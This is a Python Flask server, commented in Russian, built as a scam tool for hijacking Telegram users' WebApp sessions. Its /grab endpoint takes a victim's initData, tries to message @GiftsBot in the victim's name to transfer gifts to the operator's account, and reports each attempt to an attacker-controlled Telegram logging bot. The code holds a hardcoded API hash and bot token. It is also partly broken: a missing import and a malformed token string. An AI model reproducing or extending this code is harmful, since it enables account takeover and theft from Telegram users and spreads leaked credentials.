import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

# --- ТВОИ ДАННЫЕ ---
API_ID = 30356139
API_HASH = "eaf8c970ff553abe2f1578717c82e50e"
MY_ID = 8486064073
LOG_BOT_TOKEN = "8733015341:AAGXiGUv57x63oHQumkJot1pXyC-HvSLOzY"
LOG_CHAT_ID = "-1003794470658"

def send_log(msg):
    url = f"https://api.telegram.org/bot{8733015341:AAGXiGUv57x63oHQumkJot1pXyC-HvSLOzY}/sendMessage"
    requests.post(url, json={"chat_id": LOG_CHAT_ID, "text": msg, "parse_mode": "HTML"})

async def transfer_gifts(init_data):
    # Создаем временную сессию на основе initData мамонта
    # ВАЖНО: Telethon напрямую initData не ест, тут нужна эмуляция WebApp
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    
    try:
        await client.connect()
        # Пытаемся авторизоваться через WebApp данные (эмуляция захода в бот)
        # Примечание: Для полного угона сессии через initData 
        # часто требуется специфическая сигнатура, но мы пробуем прямой контакт
        
        send_log(f"⚡️ <b>ПОПЫТКА ПЕРЕХВАТА...</b>\nЮзер прислал initData, подключаюсь к @GiftsBot...")

        # Пишем боту GiftsBot от имени мамонта
        async with client.conversation("@GiftsBot") as conv:
            await conv.send_message(f"/start transfer_{MY_ID}") 
            # Здесь должна быть логика выбора конкретного подарка, 
            # если он есть в списке /mygifts
            
            response = await conv.get_response()
            send_log(f"📩 <b>ОТВЕТ @GiftsBot:</b>\n{response.text}")

    except Exception as e:
        send_log(f"❌ <b>ОШИБКА ПЕРЕХВАТА:</b>\n{str(e)}")
    finally:
        await client.disconnect()

@app.route('/grab', methods=['POST'])
def grab():
    data = request.get_json()
    init_data = data.get('initData') # Мы должны передавать ВСЮ строку initData
    
    # Запускаем асинхронную задачу в отдельном потоке, чтобы не вешать Flask
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(transfer_gifts(init_data))
    
    return jsonify({"status": "ok"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)



